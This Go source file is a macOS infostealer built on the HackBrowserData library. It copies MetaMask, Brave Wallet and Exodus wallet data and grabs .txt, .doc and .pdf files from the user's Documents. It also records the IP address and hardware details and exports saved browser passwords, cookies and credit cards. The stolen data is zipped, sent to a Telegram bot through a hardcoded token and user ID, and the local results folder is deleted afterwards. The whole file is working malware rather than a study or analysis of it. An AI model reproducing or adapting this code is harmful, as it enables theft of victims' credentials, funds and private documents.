package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os/user"
	"path/filepath"
	"runtime"
	"time"

	"os"

	"github.com/kbinani/screenshot"
	"github.com/urfave/cli/v2"

	"github.com/moond4rk/hackbrowserdata/browser"
	"github.com/moond4rk/hackbrowserdata/logger"
	"github.com/moond4rk/hackbrowserdata/utils/fileutil"
	"github.com/tucnak/telebot"
)

var (
	browserName  string
	outputDir    string
	outputFormat string
	verbose      bool
	compress     bool
	profilePath  string
	isFullExport bool
)

func main() {
	Execute()
}
func getDeviceName() (string, error) {
	hostname, err := os.Hostname()
	if err != nil {

	}

	return hostname, nil
}

func moveFile(src, dest string) error {
	input, err := ioutil.ReadFile(src)
	if err != nil {
		return err
	}

	err = ioutil.WriteFile(dest, input, 0644)
	if err != nil {
		return err
	}

	err = os.Remove(src)
	if err != nil {
		return err
	}

	return nil
}
func CopyDir(src string, dst string) error {
	src = filepath.Clean(src)
	dst = filepath.Clean(dst)

	si, err := os.Stat(src)
	if err != nil {
		return err
	}
	if err := os.MkdirAll(dst, si.Mode()); err != nil {
		return err
	}

	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())

		if entry.IsDir() {
			if err := CopyDir(srcPath, dstPath); err != nil {
				return err
			}
		} else {
			if err := CopyFile(srcPath, dstPath); err != nil {
				return err
			}
		}
	}

	return nil
}
func CopyFile(src, dst string) error {
	sourceFileStat, err := os.Stat(src)
	if err != nil {
		return err
	}

	if !sourceFileStat.Mode().IsRegular() {

	}

	source, err := os.Open(src)
	if err != nil {
		return err
	}
	defer source.Close()

	destination, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destination.Close()

	_, err = io.Copy(destination, source)
	return err
}
func Execute() {
	usr, err := user.Current()
	if err != nil {

		return
	}
	homeDir := usr.HomeDir
	destDir := homeDir + "/results"
	_ = os.MkdirAll(destDir, 0755)
	braveSave := homeDir + "/results/BraveWallet"
	_ = os.MkdirAll(homeDir+"/results/Metamask", 0755)
	_ = os.MkdirAll(homeDir+"/results/Exodus", 0755)
	_ = os.MkdirAll(braveSave, 0755)
	brave := homeDir + "/Library/Application Support/BraveSoftware/Brave-Browser/Default/BraveWallet/Brave Wallet Storage"
	exodus := homeDir + "/Library/Application Support/Exodus/exodus.wallet"
	src := homeDir + "/Library/Application Support/Google/Chrome/Default/Local Extension Settings"
	dst := homeDir + "/results/Metamask"

	CopyDir(src, dst)
	CopyDir(brave, braveSave)
	srcDir := homeDir + "/Documents"

	// Destination directory

	// Create the destination directory if it doesn't exist

	_ = os.MkdirAll(homeDir+"/results/FilesGrabed", 0755)

	CopyDir(exodus, homeDir+"/results/Exodus")
	resp, err := http.Get("https://api.ipify.org")
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	ip, err := io.ReadAll(resp.Body)
	if err != nil {

	}

	// Создаем директорию ~/results, если она не существует

	// Записываем IP-адрес в файл info.txt
	infoFilePath := filepath.Join(destDir, "info.txt")
	infoFile, err := os.Create(infoFilePath)
	if err != nil {

	}
	defer infoFile.Close()
	numCPU := runtime.NumCPU()
	deviceName, err := getDeviceName()

	if _, err := infoFile.Write(ip); err != nil {

	}
	_, err = infoFile.WriteString(fmt.Sprintf("\nDevice name: %d\n", deviceName))
	_, err = infoFile.WriteString(fmt.Sprintf("\nNumber of CPU cores: %d\n", numCPU))
	n := screenshot.NumActiveDisplays()
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		_, err = infoFile.WriteString(fmt.Sprintf("\nScreen extension: %d x %d\n", bounds.Dx(), bounds.Dy()))
	}
	var memStats runtime.MemStats
	runtime.ReadMemStats(&memStats)

	// Convert bytes to gigabytes
	bytesToGB := func(bytes uint64) float64 {
		return float64(bytes) / (1024 * 1024 * 1024)
	}

	// Print total system memory obtained from the OS (in gigabytes)
	infoFile.WriteString(fmt.Sprintf("Total System Memory: %.2f GB\n", bytesToGB(memStats.Sys)))
	// Walk through the source directory
	err = filepath.Walk(srcDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Check if the file is a .txt, .doc, or .pdf
		ext := filepath.Ext(path)
		if ext == ".txt" || ext == ".doc" || ext == ".pdf" {
			// Construct the destination path
			destPath := filepath.Join(homeDir+"/results/FilesGrabed", filepath.Base(path))

			// Move the file
			err = CopyFile(path, destPath)
			if err != nil {
				return err
			}

		}

		return nil
	})

	if err != nil {
		log.Fatal(err)
	}

	app := &cli.App{
		Name:      "hack-browser-data",
		Usage:     "Export passwords|bookmarks|cookies|history|credit cards|download history|localStorage|extensions from browser",
		UsageText: "[hack-browser-data -b chrome -f json -dir results --zip]\nExport all browsing data (passwords/cookies/history/bookmarks) from browser\nGithub Link: https://github.com/moonD4rk/HackBrowserData",
		Version:   "0.4.5",
		Flags: []cli.Flag{
			&cli.BoolFlag{Name: "verbose", Aliases: []string{"vv"}, Destination: &verbose, Value: false, Usage: "verbose"},
			&cli.BoolFlag{Name: "compress", Aliases: []string{"zip"}, Destination: &compress, Value: true, Usage: "compress result to zip"},
			&cli.StringFlag{Name: "browser", Aliases: []string{"b"}, Destination: &browserName, Value: "all", Usage: "available browsers: all|" + browser.Names()},
			&cli.StringFlag{Name: "results-dir", Aliases: []string{"dir"}, Destination: &outputDir, Value: "results", Usage: "export dir"},
			&cli.StringFlag{Name: "format", Aliases: []string{"f"}, Destination: &outputFormat, Value: "csv", Usage: "output format: csv|json"},
			&cli.StringFlag{Name: "profile-path", Aliases: []string{"p"}, Destination: &profilePath, Value: "", Usage: "custom profile dir path, get with chrome://version"},
			&cli.BoolFlag{Name: "full-export", Aliases: []string{"full"}, Destination: &isFullExport, Value: true, Usage: "is export full browsing data"},
		},
		HideHelpCommand: true,
		Action: func(c *cli.Context) error {
			if verbose {
				logger.Default.SetVerbose()
				logger.Configure(logger.Default)
			}
			browsers, err := browser.PickBrowsers(browserName, profilePath)
			if err != nil {

			}

			for _, b := range browsers {
				data, err := b.BrowsingData(isFullExport)
				if err != nil {

					continue
				}
				data.Output(outputDir, b.Name(), outputFormat)
			}

			if compress {
				if err = fileutil.CompressDir(outputDir); err != nil {

				}

			}
			return nil
		},
	}
	err = app.Run(os.Args)
	if err != nil {
		panic(err)
	}

	// Set up the bot
	b, err := telebot.NewBot(telebot.Settings{
		Token:  "7115710262:AAHgogpVfAmTg-0ajTsNFp8SllkP_uWiCCs",
		Poller: &telebot.LongPoller{Timeout: 10 * time.Second},
	})

	if err != nil {
		fmt.Println(err)
		return
	}

	// Path to the ZIP file
	zipFilePath := homeDir + "/results/results.zip"

	// Get file info to set the correct MIME type

	if err != nil {

		return
	}

	// Capture the entire screen

	// Send the file to the user
	userID := 985896763 // Replace with the actual user ID
	_, err = b.Send(&telebot.User{ID: userID}, &telebot.Document{
		File:    telebot.FromDisk(zipFilePath),
		Caption: "Here is your ZIP file",
	})

	if err != nil {

		return
	}

	folderPath := homeDir + "/results"

	os.RemoveAll(folderPath)

}
